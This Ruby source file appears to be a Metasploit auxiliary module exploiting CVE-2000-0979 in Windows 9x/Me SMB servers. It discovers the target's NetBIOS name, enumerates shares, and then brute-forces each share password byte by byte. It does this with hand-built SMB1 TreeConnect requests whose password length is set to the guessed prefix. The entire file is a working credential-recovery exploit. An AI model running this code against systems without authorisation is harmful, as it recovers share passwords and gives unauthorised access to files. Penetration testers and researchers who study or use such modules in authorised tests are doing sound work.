# frozen_string_literal: true

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::SMB::Client
  include Msf::Exploit::Remote::SMB::Client::Authenticated
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  RAP_SHARE_TYPES = {
    0 => 'DISK',
    1 => 'PRINTER',
    2 => 'DEVICE',
    3 => 'IPC'
  }.freeze

  # Printable ASCII range used when brute-forcing password bytes (space to ~).
  PRINTABLE = (0x20..0x7e).freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'CVE-2000-0979 SMB Share Password Enumerator',
        'Description' => %q{
          This module exploits CVE-2000-0979, an information disclosure vulnerability
          in the share-level password authentication of Microsoft Windows 9x/Me SMB
          servers. The server validates passwords one character at a time, allowing an
          attacker to enumerate the correct password byte-by-byte based on the server
          response. A zero-length password is always accepted, and each subsequent
          character can be brute-forced individually, significantly reducing the search
          space required to recover the full share password.
        },
        'Author' => [
          'Zoltan Balazs <zoltan1.balazs@gmail.com> @zh4ck',
          'Azbil SecurityFriday Co Ltd'
        ],
        'References' => [
          ['CVE', '2000-0979'],
          ['URL', 'http://www.securityfriday.com/tools/SPC.html'],
        ],
        'DisclosureDate' => '2000-10-10',
        'License' => MSF_LICENSE,
        'Notes' => {
          'AKA' => ['Share Password Checker'],
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        OptInt.new('DELAY', [true, 'Seconds to wait between password probes', 0]),
        Opt::RPORT(139),
        OptString.new('SMBName', [false, 'NetBIOS name of the target Win9x/Me machine (auto-discovered via NBNS node status if unset)', nil])
      ]
    )

    # The module always connects over the NetBIOS session service (port 139),
    # so SMBDirect is forced to false and must not be user-configurable.
    deregister_options('SMBDirect')
  end

  def run_host(ip)
    print_status('Starting CVE-2000-0979 SMB Share Password Enumerator')

    smb_name = datastore['SMBName'].presence || discover_netbios_name(ip)
    if smb_name.blank?
      print_error('Could not determine the target NetBIOS name; set SMBName manually')
      return
    end
    datastore['SMBName'] = smb_name

    # Phase 1: Connect and enumerate shares via RAP
    connect(versions: [1], backend: :ruby_smb, direct: false)
    smb_login
    report_service(host: ip, port: rport, proto: 'tcp', name: 'smb', info: "NetBIOS name: #{smb_name}")

    shares = enum_shares_rap
    if shares.empty?
      print_status('No shares found')
      disconnect
      return
    end

    disconnect

    # Phase 2: Reconnect and brute-force share passwords
    connect(versions: [1], backend: :ruby_smb, direct: false)
    smb_login

    brute_force_shares(ip, shares)

    disconnect
  rescue ::Interrupt
    raise $ERROR_INFO
  rescue Rex::ConnectionTimeout => e
    print_error(e.to_s)
  rescue Rex::Proto::SMB::Exceptions::LoginError => e
    report_login_error(e)
  rescue RubySMB::Error::RubySMBError => e
    print_error("RubySMB error: #{e}")
  rescue StandardError => e
    print_error("#{e.class}: #{e}")
  ensure
    begin
      disconnect
    rescue StandardError # rubocop:disable Lint/SuppressedException
    end
  end

  private

  # A NetBIOS session request to a Win9x/Me target is rejected unless the called
  # name matches the server's actual NetBIOS name (the *SMBSERVER wildcard is not
  # accepted). Point the operator at the SMBName option when that happens.
  def report_login_error(error)
    if error.to_s.include?('Called name not present')
      print_error("#{error} - set SMBName to the target's NetBIOS name (see nmblookup -A <ip>)")
    else
      print_error(error.to_s)
    end
  end

  # Look up the target's NetBIOS file-server name (suffix 0x20) via an NBNS node
  # status query on UDP/137. The reply normally comes back to the ephemeral
  # source port, so no privileges are needed. Win95 has a bug where it ignores
  # the source port and always replies to UDP/137; only in that case does the
  # query socket need to be bound to local port 137, which requires root.
  def discover_netbios_name(ip)
    print_status("SMBName not set; querying #{ip} for its NetBIOS name (NBNS node status)")

    name = query_netbios_name(ip)
    name ||= query_netbios_name(ip, local_port: RubySMB::Nbss::NodeStatus::NBNS_PORT) if Process.uid == 0

    if name
      print_good("Discovered NetBIOS name: #{name}")
      report_service(host: ip, port: RubySMB::Nbss::NodeStatus::NBNS_PORT, proto: 'udp', name: 'netbios', info: "NetBIOS name: #{name}")
    elsif Process.uid != 0
      print_error('NBNS lookup got no reply; a Win95 target only answers on UDP/137, which needs root. Retry as root or set SMBName manually')
    else
      print_error('NBNS lookup got no reply; set SMBName manually')
    end
    name
  end

  # Send a single NBNS node status query. When +local_port+ is set the socket
  # binds that source port (used to catch Win95 replies that always target
  # UDP/137); binding a privileged port requires root.
  def query_netbios_name(ip, local_port: nil)
    opts = {
      'PeerHost' => ip,
      'PeerPort' => RubySMB::Nbss::NodeStatus::NBNS_PORT,
      'Context' => { 'Msf' => framework, 'MsfExploit' => self }
    }
    opts['LocalPort'] = local_port if local_port
    sock = Rex::Socket::Udp.create(opts)
    RubySMB::Nbss::NodeStatus.file_server_name(ip, udp_socket: sock)
  rescue Errno::EACCES, Errno::EADDRINUSE => e
    vprint_error("Could not bind local UDP port #{local_port} (#{e.class})")
    nil
  rescue ArgumentError => e
    print_error("NBNS node status query failed: #{e}")
    nil
  ensure
    sock&.close
  end

  def enum_shares_rap
    shares = []
    tree = simple.client.tree_connect("\\\\#{rhost}\\IPC$")
    begin
      tree.net_share_enum.each do |entry|
        type_str = RAP_SHARE_TYPES.fetch(entry[:type], "UNKNOWN(#{entry[:type]})")
        shares << entry[:name]
        print_good("#{entry[:name]} - (#{type_str})")
      end
    ensure
      begin
        tree.disconnect!
      rescue StandardError # rubocop:disable Lint/SuppressedException
      end
    end
    print_good("Number of shares: #{shares.length}")
    shares
  rescue StandardError => e
    print_error("Share enumeration failed: #{e}")
    []
  end

  # Sends a raw SMB1 TreeConnect with a share password of exactly
  # +password_bytes.length+ bytes. RubySMB::Client#tree_connect appends a NUL
  # terminator and counts it in Password Length, which breaks the CVE-2000-0979
  # byte-by-byte probe: the trailing NUL never matches the next real character,
  # so no single-byte guess ever succeeds. Here Password Length equals the number
  # of guessed bytes, matching how Win9x/Me validates the password prefix.
  def tree_connect_raw(share_path, password_bytes)
    client = simple.client
    request = RubySMB::SMB1::Packet::TreeConnectRequest.new
    request.smb_header.tid = 65_535
    request.parameter_block.password_length = password_bytes.length
    request.data_block.password = password_bytes.pack('C*')
    request.data_block.path = share_path
    raw_response = client.send_recv(request)
    response = RubySMB::SMB1::Packet::TreeConnectResponse.read(raw_response)
    client.smb1_tree_from_response(share_path, response)
  end

  def try_tree_connect(share_path, password_bytes)
    tree = tree_connect_raw(share_path, password_bytes)
    vprint_status(
      "TreeConnect #{share_path} pw=#{password_bytes.map { |b| '%02X' % b }.join} STATUS_SUCCESS"
    )
    { success: true, tree: tree }
  rescue RubySMB::Error::UnexpectedStatusCode => e
    vprint_status(
      "TreeConnect #{share_path} pw=#{password_bytes.map { |b| '%02X' % b }.join} #{e.status_code.name}"
    )
    { success: false, tree: nil }
  rescue StandardError => e
    vprint_error("Tree connect error: #{e}")
    { success: false, tree: nil }
  end

  def brute_force_shares(ip, shares)
    delay = datastore['DELAY']
    shares.each do |share|
      share_path = "\\\\#{rhost}\\#{share}"
      print_status("Brute-forcing password for share: #{share}")

      password = [0x20]

      loop do
        result = try_tree_connect(share_path, password)

        if result[:success]
          if password[0] == 0x20 && password[1] == 0x20
            print_good("Empty password works for share: #{share}")
            report_share_vuln(ip, share, '')
            result[:tree]&.disconnect!
            break
          end

          confirmed = printable(password)
          print_status("Share #{share} - confirmed so far: #{confirmed}")

          result[:tree]&.disconnect!
          password.push(0x20)
        else
          password[-1] += 1

          vprint_status(printable(password))

          sleep(0.01 + delay)

          if password[-1] > PRINTABLE.max
            found = printable(password)
            if password.length > 1
              print_good("Password found for share #{share}: #{found}")
              report_share_vuln(ip, share, found)
            else
              print_status("Password not found for share: #{share}")
            end
            break
          end
        end
      rescue IOError, SocketError, SystemCallError => e
        print_error(e.message)
        break
      end
    end
  end

  def printable(password_bytes)
    password_bytes.select { |v| PRINTABLE.include?(v) }.map(&:chr).join
  end

  def report_share_vuln(ip, share, password)
    report_vuln(
      host: ip,
      port: rport,
      proto: 'tcp',
      name: name,
      info: "Share #{share} accepts password: #{password.empty? ? '<empty>' : password}",
      refs: references
    )
  end
end
